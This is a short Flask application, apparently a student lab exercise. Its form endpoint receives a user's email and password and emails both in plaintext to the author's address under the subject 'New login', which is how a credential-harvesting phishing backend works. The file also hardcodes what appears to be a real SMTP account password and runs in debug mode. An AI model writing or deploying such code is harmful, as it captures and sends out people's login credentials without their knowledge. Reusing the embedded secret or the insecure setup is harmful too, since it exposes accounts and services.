from flask import Flask, request, render_template
from flask_mail import Mail, Message

app = Flask(__name__)
app.config['MAIL_SERVER'] = 'smtp.ukr.net'
app.config['MAIL_PORT'] = 465
app.config['MAIL_USE_TLS'] = False
app.config['MAIL_USE_SSL'] = True
app.config['MAIL_USERNAME'] = 'grisharovniy@ukr.net'
app.config['MAIL_PASSWORD'] = 'egtODVstJ41wLKQB'


mail = Mail(app)


@app.route('/', methods=['GET', 'POST'])
def index():
    return render_template('ТР-23 Ровний ЛР6.html')

@app.route('/send_email', methods=['POST'])
def send_email():
  if request.method == 'POST':
    data = request.get_json()
    msg = Message('Новий вхід', sender='grisharovniy@ukr.net', recipients=['rovniy.grisha@lll.kpi.ua'])
    msg.body = f"Користувач авторизований:\nEmail: {data['email']}\nПароль: {data['password']}"
    mail.send(msg)
    return "Message sent"

if __name__ == '__main__':
    app.run(debug=True)
